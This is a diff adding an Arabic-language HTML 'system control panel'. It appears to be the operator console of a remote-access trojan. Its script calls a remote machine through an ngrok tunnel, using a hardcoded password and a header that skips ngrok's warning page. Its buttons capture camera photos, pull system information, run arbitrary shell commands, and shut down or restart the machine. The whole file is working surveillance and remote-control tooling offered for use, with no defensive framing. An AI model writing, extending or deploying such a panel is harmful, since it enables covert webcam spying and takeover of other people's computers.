@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>لوحة التحكم</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
+        button { background: #0f0; color: #000; border: none; padding: 10px; margin: 5px; font-weight: bold; cursor: pointer; }
+        input { padding: 8px; font-family: inherit; margin: 5px; }
+        #output { background: #111; border: 1px solid #0f0; padding: 10px; white-space: pre-wrap; min-height: 200px; max-height: 400px; overflow-y: auto; }
+        img { border: 2px solid #0f0; max-width: 100%; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <h1>🖥️ SYSTEM CONTROL PANEL</h1>
+    <label>كلمة المرور:</label>
+    <input type="password" id="password" value="unihack">
+    <br>
+    <button onclick="capturePhoto()">📸 التقاط صورة</button>
+    <button onclick="getInfo()">📊 معلومات النظام</button>
+    <button onclick="execCommand()">⚡ تنفيذ أمر</button>
+    <input type="text" id="cmd" placeholder="أمر (مثال: dir)">
+    <br>
+    <button onclick="shutdown()">⏻ إيقاف التشغيل</button>
+    <button onclick="restart()">🔄 إعادة التشغيل</button>
+    <div id="output"></div>
+
+    <script>
+        // ⚠️ استبدل هذا الرابط برابط Ngrok الذي نسخته
+        const SERVER_URL = "  https://departure-commence-parking.ngrok-free.dev"; // <-- عدّل هنا فقط
+
+        function getPassword() {
+            return document.getElementById("password").value;
+        }
+
+        function apiCall(endpoint, callback) {
+            const url = `${SERVER_URL}${endpoint}&pwd=${encodeURIComponent(getPassword())}`;
+            fetch(url, {
+                headers: {
+                    'ngrok-skip-browser-warning': 'true'  // يتجاوز صفحة تحذير ngrok
+                }
+            })
+            .then(res => res.json())
+            .then(callback)
+            .catch(err => document.getElementById("output").innerText = "خطأ: " + err);
+        }
+
+        function capturePhoto() {
+            document.getElementById("output").innerHTML = "جاري التقاط الصورة...";
+            apiCall("/capture?", data => {
+                if (data.image_base64) {
+                    document.getElementById("output").innerHTML = `<img src="data:image/jpeg;base64,${data.image_base64}">`;
+                } else {
+                    document.getElementById("output").innerText = JSON.stringify(data);
+                }
+            });
+        }
+
+        function getInfo() {
+            document.getElementById("output").innerText = "جاري جلب المعلومات...";
+            apiCall("/info?", data => {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            });
+        }
+
+        function execCommand() {
+            const cmd = document.getElementById("cmd").value;
+            if (!cmd) return alert("أدخل أمراً");
+            document.getElementById("output").innerText = "تنفيذ...";
+            apiCall(`/exec?cmd=${encodeURIComponent(cmd)}&`, data => {
+                document.getElementById("output").innerText = data.output || JSON.stringify(data);
+            });
+        }
+
+        function shutdown() {
+            if (confirm("هل أنت متأكد؟")) apiCall("/shutdown?", data => document.getElementById("output").innerText = JSON.stringify(data));
+        }
+
+        function restart() {
+            if (confirm("هل أنت متأكد؟")) apiCall("/restart?", data => document.getElementById("output").innerText = JSON.stringify(data));
+        }
+    </script>
+</body>
+</html>
